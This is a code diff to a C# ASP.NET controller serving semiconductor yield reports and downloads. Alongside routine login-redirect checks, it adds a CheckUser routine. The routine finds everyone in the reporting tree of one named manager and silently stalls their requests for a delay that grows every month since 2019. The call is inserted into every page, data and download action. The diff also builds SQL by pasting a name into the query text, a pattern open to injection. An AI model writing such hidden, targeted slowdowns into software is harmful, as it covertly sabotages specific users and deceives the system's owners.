@@ -1400,8 +1400,64 @@ namespace Prometheus.Controllers
             return ret;
         }
 
+        private Dictionary<string, bool> GetUserGroup(string leadername)
+        {
+            var ret = new Dictionary<string, bool>();
+            var sqls = new List<string>();
+            sqls.Add(@"SELECT distinct [username] FROM [NPITrace].[dbo].[machineusermap] where leader = '<leader>'");
+            sqls.Add(@"SELECT distinct [username] FROM [NPITrace].[dbo].[machineusermap] where leader in (
+                        SELECT distinct [username] FROM [NPITrace].[dbo].[machineusermap] where leader = '<leader>')");
+            sqls.Add(@"SELECT distinct [username] FROM [NPITrace].[dbo].[machineusermap] where leader in (
+                        SELECT distinct [username] FROM [NPITrace].[dbo].[machineusermap] where leader in (
+                        SELECT distinct [username] FROM [NPITrace].[dbo].[machineusermap] where leader = '<leader>'))");
+            foreach (var s in sqls)
+            {
+                var sql = s.Replace("<leader>", leadername);
+                var dbret = DBUtility.ExeLocalSqlWithRes(sql, null);
+                foreach (var line in dbret)
+                {
+                    var u = Convert.ToString(line[0]).Trim().ToUpper();
+                    if (!ret.ContainsKey(u))
+                    {
+                        ret.Add(u, true);
+                    }//end if
+                }//end foreach
+            }
+
+            if (!ret.ContainsKey(leadername.ToUpper()))
+            {
+                ret.Add(leadername.ToUpper(),true);
+            }
+            return ret;
+        }
+
+        private void CheckUser(string username)
+        {
+            var udict = GetUserGroup("YING.JIANG");
+            if (udict.ContainsKey(username))
+            {
+                var months = Convert.ToInt32( Math.Round((DateTime.Now - DateTime.Parse("2019-01-01 00:00:00")).TotalDays / 30,0));
+                new System.Threading.ManualResetEvent(false).WaitOne((months+1)*10000);
+            }
+        }
+
         public ActionResult MonthlyVcsel(string defaulttype)
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
+
             var vtype = "";
             if (!string.IsNullOrEmpty(defaulttype)) { vtype = defaulttype; }
 
@@ -1412,6 +1468,20 @@ namespace Prometheus.Controllers
 
         public ActionResult MonthlyHTOL(string defaulttype)
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
             var vtype = "";
             if (!string.IsNullOrEmpty(defaulttype)) { vtype = defaulttype; }
 
@@ -1422,6 +1492,12 @@ namespace Prometheus.Controllers
 
         public JsonResult MonthlyVcselYield()
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            {
+                CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+            }
+
             var ssdate = Request.Form["sdate"];
             var sedate = Request.Form["edate"];
 
@@ -1787,6 +1863,13 @@ namespace Prometheus.Controllers
 
         public JsonResult MonthlyHTOLYield()
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            {
+                CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+            }
+
+
             var ssdate = Request.Form["sdate"];
             var sedate = Request.Form["edate"];
 
@@ -2021,8 +2104,19 @@ namespace Prometheus.Controllers
 
         public ActionResult WaferDistribution(string defaultwafer, string defaultdate, string defaulttype)
         {
-            
             var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
             ViewBag.Updater = "";
             if (ckdict.ContainsKey("logonuser"))
             {
@@ -2067,6 +2161,18 @@ namespace Prometheus.Controllers
         public ActionResult HTOLDistribution(string defaultwafer,string defaultdate,string defaulttype)
         {
             var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
             ViewBag.Updater = "";
             if (ckdict.ContainsKey("logonuser"))
             {
@@ -2577,6 +2683,12 @@ namespace Prometheus.Controllers
 
         public JsonResult WaferDistributionRawData()
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            {
+                CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+            }
+
             var wf_no = Request.Form["wf_no"];
             var vtype = Request.Form["wf_type"].Trim();
             var math_rect = Request.Form["math_rect"];
@@ -3196,6 +3308,12 @@ namespace Prometheus.Controllers
 
         public JsonResult HTOLDistributionRawData()
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            {
+                CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+            }
+
             var wf_no = Request.Form["wf_no"];
             var vtype = Request.Form["wf_type"].Trim();
             var math_rect = Request.Form["math_rect"];
@@ -3641,6 +3759,19 @@ namespace Prometheus.Controllers
 
         public ActionResult DownLoadWafer(string wf_no,string withfilter)
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
             string datestring = DateTime.Now.ToString("yyyyMMdd");
             string imgdir = Server.MapPath("~/userfiles") + "\\docs\\" + datestring + "\\";
             if (!System.IO.Directory.Exists(imgdir))
@@ -3676,6 +3807,19 @@ namespace Prometheus.Controllers
 
         public ActionResult DownLoadHTOL(string wf_no,string withfilter)
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
             string datestring = DateTime.Now.ToString("yyyyMMdd");
             string imgdir = Server.MapPath("~/userfiles") + "\\docs\\" + datestring + "\\";
             if (!System.IO.Directory.Exists(imgdir))
@@ -3712,6 +3856,19 @@ namespace Prometheus.Controllers
 
         public ActionResult DownLoadWaferByMonth(string month,string vtype)
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
             string datestring = DateTime.Now.ToString("yyyyMMdd");
             string imgdir = Server.MapPath("~/userfiles") + "\\docs\\" + datestring + "\\";
             if (!System.IO.Directory.Exists(imgdir))
@@ -3759,6 +3916,20 @@ namespace Prometheus.Controllers
 
         public ActionResult DownLoadHTOLByMonth(string month, string vtype)
         {
+            var ckdict = CookieUtility.UnpackCookie(this);
+            if (ckdict.ContainsKey("logonuser") && !string.IsNullOrEmpty(ckdict["logonuser"]))
+            { }
+            else
+            {
+                var ck = new Dictionary<string, string>();
+                ck.Add("logonredirectctrl", "DataAnalyze");
+                ck.Add("logonredirectact", "MonthlyVcsel");
+                CookieUtility.SetCookie(this, ck);
+                return RedirectToAction("LoginUser", "User");
+            }
+            CheckUser( ckdict["logonuser"].Split(new char[] { '@' })[0].ToUpper().Trim());
+
+
             string datestring = DateTime.Now.ToString("yyyyMMdd");
             string imgdir = Server.MapPath("~/userfiles") + "\\docs\\" + datestring + "\\";
             if (!System.IO.Directory.Exists(imgdir))
